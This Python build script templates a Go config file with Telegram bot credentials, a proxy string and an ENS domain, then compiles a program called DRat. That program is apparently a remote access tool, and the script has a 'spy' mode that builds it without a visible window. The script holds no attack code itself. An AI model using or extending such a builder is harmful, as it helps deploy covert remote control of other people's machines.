'''
Author: SpenserCai
Date: 2023-03-05 22:16:51
version: 
LastEditors: SpenserCai
LastEditTime: 2023-03-13 22:11:32
Description: file content
'''
import json
import sys
import os
import platform

TMP = '''
package config

var TELBOT_TOKEN = "{TELBOT_TOKEN}"

var TELBOT_CHAT_ID = {TELBOT_CHAT_ID}

var CLASH_CONN_STR = "{CLASH_CONN_STR}"

var LOCAL_PROXY_PORT = {LOCAL_PROXY_PORT}

var ENS_DOMAIN = "{ENS_DOMAIN}"
'''

if __name__ == '__main__':
    # 通过参数传入的配置文件路径
    config_path = sys.argv[1]
    # 读取配置文件
    with open(config_path, 'r') as f:
        config = json.load(f)
    config_str = TMP.format(**config)
    # 去掉第一行的换行
    config_str = config_str[1:]
    # 写入到config.go文件中
    with open('config/config.go', 'w',encoding="utf8") as f:
        f.write(config_str)
    # 依次执行go mod tidy,set CGO_ENABLED=1,set GOARCH=386,go build,在同一个控制台中执行
    os.system('go mod tidy')
    # 设置环境变量 CGO_ENABLED=1
    os.environ['CGO_ENABLED'] = '0'
    # os.environ['GOARCH'] = '386'
    # 通过第三个参数判断是windows还是linux
    if sys.argv[3] == "windows":
        os.environ['GOOS'] = 'windows'
    else:
        os.environ['GOOS'] = 'linux'
    if sys.argv[2] == "spy":
        os.system('go build -ldflags="-H windowsgui -w -s"')
    else:
        os.system('go build')
    # 加载build_config.json还原
    with open("build_config.json", "r") as f:
        config = json.load(f)
    config_str = TMP.format(**config)
    config_str = config_str[1:]
    with open('config/config.go', 'w',encoding="utf8") as f:
        f.write(config_str)
    # 如果release目录不存在，则创建
    if not os.path.exists("release"):
        os.mkdir("release")
    # 把生成的可执行文件拷贝到release目录下
    if platform.system().lower() == 'windows':
        if sys.argv[3] == "windows":
            os.system('copy DRat.exe release\\DRat.exe')
        else:
            os.system('copy DRat release\\DRat')
    else:
        if sys.argv[3] == "windows":
            os.system('cp DRat.exe release/DRat.exe')
        else:
            os.system('cp DRat release/DRat')
